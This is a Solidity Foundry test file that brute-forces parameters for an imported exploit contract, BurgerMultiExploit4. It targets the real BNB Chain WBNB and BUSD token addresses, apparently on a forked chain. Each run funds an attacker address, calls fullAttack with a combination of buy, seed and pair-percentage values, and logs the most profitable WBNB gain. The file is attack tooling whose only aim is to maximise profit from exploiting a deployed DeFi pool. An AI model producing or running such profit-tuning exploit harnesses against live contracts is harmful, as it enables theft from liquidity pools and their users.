// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "./BurgerMultiTest4.t.sol";

contract BurgerMultiTest9 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    function _tryAttack(uint256 buyAmt, uint256 seedAmt, uint256 pairPct) internal returns (int256) {
        address att = makeAddr(string(abi.encodePacked("a", buyAmt, seedAmt, pairPct)));
        vm.deal(att, 5000 ether);
        vm.startPrank(att);

        BurgerMultiExploit4 e = new BurgerMultiExploit4();
        IWBNB(WBNB).deposit{value: 3000 ether}();
        IWBNB(WBNB).transfer(address(e), 3000 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));

        try e.fullAttack(BUSD, buyAmt, seedAmt, pairPct) {
            uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
            vm.stopPrank();
            return int256(wbnbAfter) - int256(wbnbBefore);
        } catch {
            vm.stopPrank();
            return type(int256).min;
        }
    }

    function test_busd_fine_tune() public {
        int256 bestDelta = type(int256).min;
        uint256 bestBuy;
        uint256 bestSeed;
        uint256 bestPct;

        // Fine-tune around buy=400, seed=30, pct=40
        uint256[7] memory buys = [uint256(300 ether), 350 ether, 400 ether, 450 ether, 500 ether, 600 ether, 700 ether];
        uint256[5] memory seeds = [uint256(20 ether), 25 ether, 30 ether, 35 ether, 40 ether];
        uint256[5] memory pcts = [uint256(30), 35, 40, 45, 50];

        for (uint b = 0; b < buys.length; b++) {
            for (uint s = 0; s < seeds.length; s++) {
                for (uint p = 0; p < pcts.length; p++) {
                    int256 delta = _tryAttack(buys[b], seeds[s], pcts[p]);
                    if (delta > bestDelta) {
                        bestDelta = delta;
                        bestBuy = buys[b];
                        bestSeed = seeds[s];
                        bestPct = pcts[p];
                    }
                    if (delta > 0) {
                        emit log_named_uint("buy", buys[b] / 1 ether);
                        emit log_named_uint("seed", seeds[s] / 1 ether);
                        emit log_named_uint("pct", pcts[p]);
                        emit log_named_int("delta", delta);
                    }
                }
            }
        }

        emit log_string("=== BEST ===");
        emit log_named_uint("bestBuy", bestBuy / 1 ether);
        emit log_named_uint("bestSeed", bestSeed / 1 ether);
        emit log_named_uint("bestPct", bestPct);
        emit log_named_int("bestDelta", bestDelta);
    }
}
